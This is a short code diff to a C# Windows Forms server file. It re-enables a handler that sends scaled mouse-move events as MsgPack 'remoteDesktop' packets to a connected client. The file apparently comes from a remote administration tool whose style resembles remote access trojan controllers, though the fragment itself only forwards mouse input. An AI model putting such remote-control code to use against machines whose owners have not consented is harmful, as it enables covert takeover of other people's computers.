@@ -226,23 +226,23 @@ namespace Server.Forms
             catch { }
         }
 
-        //private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
-        //{
-        //    try
-        //    {
-        //        if (pictureBox1.Image != null && this.ContainsFocus && isMouse)
-        //        {
-        //            Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
-        //            MsgPack msgpack = new MsgPack();
-        //            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-        //            msgpack.ForcePathObject("Option").AsString = "mouseMove";
-        //            msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
-        //            msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
-        //            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
-        //        }
-        //    }
-        //    catch { }
-        //}
+        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
+        {
+            try
+            {
+                if (pictureBox1.Image != null && this.ContainsFocus && isMouse)
+                {
+                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                    msgpack.ForcePathObject("Option").AsString = "mouseMove";
+                    msgpack.ForcePathObject("X").AsInteger = p.X;
+                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+                }
+            }
+            catch { }
+        }
 
         private void Button3_Click(object sender, EventArgs e)
         {
@@ -332,5 +332,7 @@ namespace Server.Forms
                    || ((key & Keys.NumLock) == Keys.NumLock)
                    || ((key & Keys.Scroll) == Keys.Scroll);
         }
+
+
     }
 }
